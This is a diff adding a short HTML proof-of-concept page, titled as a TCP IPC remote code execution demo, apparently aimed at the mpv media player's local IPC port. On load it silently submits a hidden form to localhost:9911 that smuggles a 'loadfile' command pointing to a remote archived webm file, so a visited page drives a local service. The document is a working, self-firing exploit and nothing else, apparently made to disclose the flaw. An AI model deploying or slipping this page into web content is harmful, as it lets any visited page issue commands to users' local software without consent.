@@ -1,0 +1,10 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>TCP IPC remote code execution PoC</title>
+<iframe style="display: none" name="mpv-ipc-post"></iframe>
+<form id="form" target="mpv-ipc-post" method="POST" action="http://localhost:9911" enctype="text/plain">
+	<input type="hidden" name="i" value="
+loadfile http://web.archive.org/web/20150611115628/http://a.pomf.se/nkmjkl.webm
+">
+</form>
+<script>document.getElementById('form').submit();</script>
